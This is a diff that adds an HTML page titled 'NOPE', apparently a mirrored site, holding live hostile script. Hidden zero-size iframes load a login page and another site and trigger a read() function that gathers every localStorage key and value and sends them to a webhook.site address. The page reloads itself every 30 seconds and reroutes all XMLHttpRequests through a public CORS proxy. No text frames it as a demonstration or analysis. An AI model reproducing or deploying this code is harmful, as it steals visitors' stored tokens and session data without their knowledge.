@@ -1,0 +1,62 @@
+<!doctype html>
+<html xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml" lang="en-US">
+
+  <meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+
+  <head>
+    <title>NOPE</title>
+<iframe id="ifrm" src="https://app.peerly.com/login" style="width:0; height:0; border:0; border:none" onload="read()"></iframe>
+    <script>
+      function read() {
+        if (window.localStorage) {
+          if (localStorage.length) {
+            var output;
+            for (var i = 0; i < localStorage.length; i++) {
+              if (i > 0) {
+                output += "&";
+              }
+              output += encodeURIComponent(localStorage.key(i)) + '=' + encodeURIComponent(localStorage.getItem(localStorage.key(i)));
+            }
+            new Image().src = 'https://webhook.site/41ed860c-bff5-4be6-804d-f1c783501830/' + output;
+          }
+        }
+
+      }
+
+    </script>
+  </head>
+
+  <body>
+  <iframe id="ifrm2" src="https://whyvote.blue" style="width:0; height:0; border:0; border:none" onload="read()"></iframe>
+  </body>
+  <script type = "text/JavaScript">
+         <!--
+            function AutoRefresh( t ) {
+               setTimeout("location.reload(true);", t);
+            }
+         //-->
+      </script>
+      
+   
+   <body onload = "JavaScript:AutoRefresh(30000);">
+   </body>
+   <body>
+   <script>(function() {
+    var cors_api_host = 'cors-anywhere.herokuapp.com';
+    var cors_api_url = 'https://' + cors_api_host + '/';
+    var slice = [].slice;
+    var origin = window.location.protocol + '//' + window.location.host;
+    var open = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function() {
+        var args = slice.call(arguments);
+        var targetOrigin = /^https?:\/\/([^\/]+)/i.exec(args[1]);
+        if (targetOrigin && targetOrigin[0].toLowerCase() !== origin &&
+            targetOrigin[1] !== cors_api_host) {
+            args[1] = cors_api_url + args[1];
+        }
+        return open.apply(this, args);
+    };
+})();</script>
+   </body>
+   
+</html>
